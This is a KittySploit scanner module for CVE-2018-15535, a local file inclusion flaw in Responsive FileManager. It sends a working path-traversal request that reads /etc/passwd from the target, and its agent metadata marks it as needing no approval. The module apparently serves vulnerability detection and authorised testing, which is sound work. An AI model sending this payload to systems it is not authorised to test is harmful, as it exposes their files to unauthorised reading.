#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Responsive FileManager before version 9."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Responsive FileManager <9.13.4 - Local File Inclusion Detection',
        'description': 'Responsive FileManager before version 9.13.4 is vulnerable to local file inclusion via filemanager/ajax_calls.php because it uses external input to construct a pathname that should be within a restricted directory, aka local file inclusion.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'lfi', 'edb', 'seclists', 'tecrail', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/45271',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-15535',
            'http://seclists.org/fulldisclosure/2018/Aug/34',
            'https://www.exploit-db.com/exploits/45271/',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2018-15535',
    }

    def run(self):
        r = self.http_request(method="GET", path='/filemanager/ajax_calls.php?action=get_file&sub_action=preview&preview_mode=text&title=source&file=../../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Responsive FileManager <9.13.4 - Local File Inclusion detected",
                path='/filemanager/ajax_calls.php?action=get_file&sub_action=preview&preview_mode=text&title=source&file=../../../../etc/passwd',
            )
            return True
        return False

